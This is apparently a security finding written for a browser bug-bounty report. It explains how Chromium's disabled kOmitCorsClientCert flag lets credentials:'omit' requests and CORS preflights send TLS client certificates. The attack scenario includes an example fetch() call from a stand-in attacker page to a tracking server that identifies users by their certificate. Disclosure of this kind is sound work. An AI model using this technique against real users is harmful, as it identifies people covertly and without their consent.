# Finding 075: CORS Preflight and credentials:omit Requests Still Send TLS Client Certificates

## Summary

Due to `kOmitCorsClientCert` being DISABLED by default, requests with `CredentialsMode::kOmit` still send TLS client certificates. This is an acknowledged bug (crbug.com/40089326) where the behavior does not match the Fetch specification. Client certificates identify the user (name, organization, unique key) and are sent during the TLS handshake before any HTTP-level checks.

## Affected Files

- `services/network/public/cpp/features.cc:195-197` — `kOmitCorsClientCert` DISABLED_BY_DEFAULT
- `services/network/url_loader_util.cc:104-112` — `CredentialsMode::kOmit` returns true (send certs) when flag disabled

## Details

```cpp
// url_loader_util.cc:104-112
// TODO(crbug.com/40089326): Due to a bug, the default behavior does
// not properly correspond to Fetch's "credentials mode", in that client
// certificates will be sent if available, or the handshake will be aborted
// to allow selecting a client cert.
case mojom::CredentialsMode::kOmit:
    return !base::FeatureList::IsEnabled(features::kOmitCorsClientCert);
    // Returns TRUE (send certs) when flag is disabled
```

This function (`ShouldNotifyAboutClientCertificates`) returns whether the TLS layer should offer client certificates during the handshake. When the flag is disabled (default), even `kOmit` mode sends certificates.

A special workaround mode exists:
```cpp
case mojom::CredentialsMode::kOmitBug_775438_Workaround:
    return false;  // Actually omits certs, but only used in specific places
```

## Attack Scenario

### Cross-origin user identification via TLS client certificate

1. User has a TLS client certificate installed (common in enterprise environments)
2. `https://attacker.example` makes a `fetch('https://tracking-server.example/beacon', {credentials: 'omit'})`
3. Despite `credentials: 'omit'`, the TLS handshake includes the client certificate
4. `tracking-server.example` reads the certificate's subject (CN=John Smith, O=Acme Corp)
5. The user is uniquely identified without any browser UI or consent

### CORS preflight certificate leak

1. Cross-origin CORS request triggers a preflight OPTIONS request
2. The preflight should not include credentials (per Fetch spec)
3. But the TLS client certificate is sent during the preflight's TLS handshake
4. The cross-origin server learns the user's identity before the actual CORS request

## Impact

- **No compromised renderer required**: Standard `fetch()` API with `credentials: 'omit'`
- **User identity leak**: TLS client certificates contain real-world identity (name, org, serial number)
- **No user interaction**: No certificate prompt shown (cert is auto-selected)
- **Spec violation**: Fetch spec requires credentials:omit to not send client certs
- **Known bug**: crbug.com/40089326 (fix code exists but disabled)

## Relationship to Finding 044

This finding provides the root cause code for Finding 044 (TLS Client Cert Leak). Finding 044 identified the issue from the Fetch spec perspective; this finding pinpoints the exact disabled feature flag and code path.

## VRP Value

**Medium-High** — No compromised renderer. Leaks real user identity. Spec violation. The workaround mode (`kOmitBug_775438_Workaround`) proves Chrome knows this is a security issue but hasn't fully deployed the fix.
